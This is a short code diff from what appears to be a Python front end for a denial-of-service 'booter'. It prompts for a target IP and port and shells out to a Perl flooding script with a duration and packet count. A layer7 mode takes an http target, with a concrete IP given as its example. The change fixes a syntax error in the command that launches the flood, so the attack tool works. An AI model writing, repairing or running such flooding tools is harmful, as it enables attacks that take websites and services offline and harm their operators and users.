@@ -10,7 +10,7 @@ def layer4():
     os.system("clear")
     port = input("Please enter a port to hit \nNormally the port is just 80 \n\nEnter >>>")
     os.system("clear")
-    os.system('perl booter.pl ' + ip' '+ port + " 300 10000")
+    os.system('perl booter.pl ' + ip + " " + port + " 300 10000")
 
 def layer7():
     http = input("WARNING ONLY WORKS FOR http:// IP'S OR DOMAIN'S\n EXAMPLE: http://23.237.196.90\n\nEnter http website >>> ")
